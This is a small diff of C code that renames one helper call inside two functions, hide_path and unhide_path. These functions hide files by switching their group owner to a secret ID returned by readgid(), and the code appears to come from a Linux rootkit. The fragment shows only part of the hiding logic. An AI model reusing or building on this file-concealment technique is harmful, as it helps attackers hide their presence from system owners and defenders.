@@ -41,7 +41,7 @@ int hide_path(char *path){
     return 0;
 #endif
 
-    if(not_user(0)) return PATH_ERR;
+    if(notuser(0)) return PATH_ERR;
     if(hidden_path(path)) return PATH_DONE;
     return chown_path(path, readgid());
 }
@@ -51,7 +51,7 @@ int unhide_path(char *path){
     return 0;
 #endif
 
-    if(not_user(0)) return PATH_ERR;
+    if(notuser(0)) return PATH_ERR;
     if(!hidden_path(path)) return PATH_DONE;
     return chown_path(path, 0);
 }
